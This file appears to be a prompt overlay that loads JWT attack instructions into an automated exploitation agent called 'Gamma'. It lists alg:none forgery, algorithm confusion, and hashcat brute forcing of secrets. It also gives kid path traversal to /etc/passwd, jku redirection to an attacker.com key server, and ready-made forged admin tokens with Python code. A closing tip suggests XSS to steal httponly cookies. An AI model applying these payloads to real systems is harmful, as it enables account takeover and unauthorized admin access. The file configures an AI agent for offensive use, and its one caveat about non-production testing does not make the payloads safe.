# JWT — Dynamic Overlay

## Metadata
- **Exploit Type**: jwt
- **Applies To**: Gamma
- **Loading**: Appended when `exploit_type === "jwt"`

---

## OVERLAY_CONTEXT

JWT exploitation targets misconfigured or weak JSON Web Token implementations. Tokens are base64-encoded and signed. Success indicators: gaining admin access, forging arbitrary tokens, or extracting key material.

---

## Token Structure

```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

---

## Attacks

### 1. alg:none (Baseline)
```
Modify header: {"alg":"none","typ":"JWT"}
Signature: (empty)
```

### 2. Algorithm Confusion: HS256 → RS256 (Aggressive)
```
Scenario: Server uses RS256 but code accepts HS256
Attack: Obtain the public key, sign payload with it using HS256
```

### 3. Weak Secret Brute Force (Baseline)
```
Use wordlist: rockyou.txt, common_jwt_secrets.txt
Tool: hashcat -m 16500 jwt_hash.txt wordlist.txt
```

### 4. kid Injection (Aggressive)
```
{"alg":"HS256","kid":"../../etc/passwd"}
Use: "../../etc/passwd" as the secret
```

### 5. jku/x5u Tampering (Evasive)
```
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
Point jku to attacker-controlled JWKS endpoint
```

### 6. Claim Tampering (Baseline)
```
Modify payload: {"role":"admin"} added or changed
Re-sign with known secret (alg:none or weak secret)
```

---

## Payloads

### alg:none Forge
```python
import jwt
payload = {"sub":"admin","role":"admin","iat":1516239022}
token = jwt.encode(payload, "", algorithm="none")
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
```

### Claim Tampering
```
Original payload: {"sub":"user123","role":"user","iat":1516239022}
Modified:        {"sub":"admin","role":"admin","iat":1516239022}
Re-sign with secret
```

### Force No Signature
```
Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
Payload: eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyfQ
Signature: (empty string)
```

---

## JWT Libraries & Tools

```
# Python
import jwt
jwt.encode(payload, secret, algorithm="HS256")
jwt.decode(token, secret, algorithm="HS256")

# Via curl
curl -H "Authorization: Bearer <token>" http://target/api

# Brute force
hashcat -m 16500 jwt.txt wordlist.txt
```

---

## Constraints

```
- NEVER modify tokens without testing on a non-production system first
- alg:none requires the server to actually accept "none" algorithm
- RS256 → HS256 confusion requires obtaining the public key first
- For brute force: use targeted wordlists, not full rockyou for speed
- If JWT is httponly cookie: try XSS to steal it before JWT attacks
```

---

*Overlay version: 1.0*
